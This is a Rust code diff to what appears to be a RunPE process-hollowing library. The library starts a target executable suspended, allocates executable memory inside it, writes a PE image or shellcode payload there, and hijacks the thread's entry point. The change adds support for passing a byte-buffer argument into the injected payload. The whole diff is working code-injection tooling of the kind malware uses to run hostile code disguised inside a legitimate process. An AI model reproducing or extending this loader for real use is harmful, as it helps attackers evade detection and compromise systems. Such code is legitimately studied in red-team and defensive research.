@@ -55,6 +55,7 @@ struct CustomArgument {
     entry_point: u64,
     entry_point_argument: u64,
     argument: u64,
+    argument_length: u64,
 }
 
 pub enum Payload<'a> {
@@ -91,13 +92,15 @@ enum ParsedPayload<'a> {
 }
 
 impl<'a> ParsedPayload<'a> {
-    fn image_size(&self) -> usize {
+    fn image_size(&self, buffer_size: usize) -> usize {
         match self {
             ParsedPayload::Shellcode(sh) => {
                 let shellcode_len = sh.len();
                 let aligned_for_argument =
                     align_up(shellcode_len, core::mem::align_of::<CustomArgument>());
-                align_page_size(aligned_for_argument + core::mem::size_of::<CustomArgument>())
+                align_page_size(
+                    aligned_for_argument + core::mem::size_of::<CustomArgument>() + buffer_size,
+                )
             }
             ParsedPayload::Pe(pe) => pe.nt.OptionalHeader.SizeOfImage as usize,
         }
@@ -110,10 +113,10 @@ impl<'a> ParsedPayload<'a> {
         }
     }
 
-    fn custom_argument_offset(&self) -> Option<u64> {
+    fn custom_argument_offset(&self) -> Option<usize> {
         match self {
             ParsedPayload::Shellcode(sh) => {
-                Some(align_up(sh.len(), core::mem::align_of::<CustomArgument>()) as u64)
+                Some(align_up(sh.len(), core::mem::align_of::<CustomArgument>()))
             }
             ParsedPayload::Pe(_) => None,
         }
@@ -169,10 +172,27 @@ fn align_up(n: usize, alignment: usize) -> usize {
 #[repr(align(16))]
 struct ContextWrapper(CONTEXT);
 
+pub enum Argument<'a> {
+    None,
+    U64(u64),
+    Bytes(&'a [u8]),
+}
+
+impl<'a> Argument<'a> {
+    pub fn buffer_size(&self) -> Option<usize> {
+        match self {
+            Argument::None => None,
+            Argument::U64(_) => None,
+            Argument::Bytes(b) => Some(b.len()),
+        }
+    }
+}
+
 pub unsafe fn runpe_existing(
     process: HANDLE,
     thread: HANDLE,
     payload: Payload,
+    argument: Argument<'_>,
 ) -> Result<(), RunpeError> {
     // Get thread context.
     let mut ctx: ContextWrapper = core::mem::zeroed();
@@ -186,16 +206,18 @@ pub unsafe fn runpe_existing(
 
     // Get original entry point.
     let original_entry_point = ctx.0.Rcx as usize;
-    let argument = ctx.0.Rdx as usize;
-    let peb = argument as *const u8;
+    let entry_point_argument = ctx.0.Rdx as usize;
+    let peb = entry_point_argument as *const u8;
 
     let parsed_payload = payload.parse()?;
 
     // Allocate memory for the payload.
+    let argument_buffer_size = argument.buffer_size().unwrap_or(0);
+    let mem_size = parsed_payload.image_size(argument_buffer_size);
     let image_base = VirtualAllocEx(
         process,
         0 as _,
-        parsed_payload.image_size() as SIZE_T,
+        mem_size as SIZE_T,
         MEM_RESERVE | MEM_COMMIT,
         PAGE_EXECUTE_READWRITE,
     ) as *const u8;
@@ -223,10 +245,29 @@ pub unsafe fn runpe_existing(
 
     // Write custom argument.
     if let Some(argument_offset) = parsed_payload.custom_argument_offset() {
+        let (argument, argument_length) = match argument {
+            Argument::None => (0, 0),
+            Argument::U64(v) => (v, 0),
+            Argument::Bytes(bytes) => {
+                let buffer_offset = argument_offset + core::mem::size_of::<CustomArgument>();
+
+                writeproc!(
+                    process,
+                    image_base,
+                    buffer_offset,
+                    bytes.as_ptr(),
+                    bytes.len()
+                );
+
+                (image_base.add(buffer_offset) as u64, bytes.len())
+            }
+        };
+
         let argument = CustomArgument {
             entry_point: original_entry_point as u64,
-            entry_point_argument: argument as u64,
-            argument: 0,
+            entry_point_argument: entry_point_argument as u64,
+            argument,
+            argument_length: argument_length as u64,
         };
 
         writeproc!(
@@ -248,7 +289,9 @@ pub unsafe fn runpe_existing(
 }
 
 // SAFETY: `executable` must be a valid pointer to a null-terminated char array.
-pub unsafe fn create_suspended_process(executable: *const i8) -> Result<PROCESS_INFORMATION, RunpeError> {
+pub unsafe fn create_suspended_process(
+    executable: *const i8,
+) -> Result<PROCESS_INFORMATION, RunpeError> {
     let mut startupinfo: STARTUPINFOA = unsafe { core::mem::zeroed() };
     startupinfo.cb = core::mem::size_of_val(&startupinfo) as DWORD;
     let mut processinfo: PROCESS_INFORMATION = unsafe { core::mem::zeroed() };
@@ -275,10 +318,11 @@ pub unsafe fn runpe(
     executable: *const i8,
     payload: Payload,
     resume: bool,
+    argument: Argument<'_>,
 ) -> Result<PROCESS_INFORMATION, RunpeError> {
     let processinfo = create_suspended_process(executable)?;
 
-    match runpe_existing(processinfo.hProcess, processinfo.hThread, payload) {
+    match runpe_existing(processinfo.hProcess, processinfo.hThread, payload, argument) {
         Ok(_) => {
             if resume {
                 ResumeThread(processinfo.hThread);
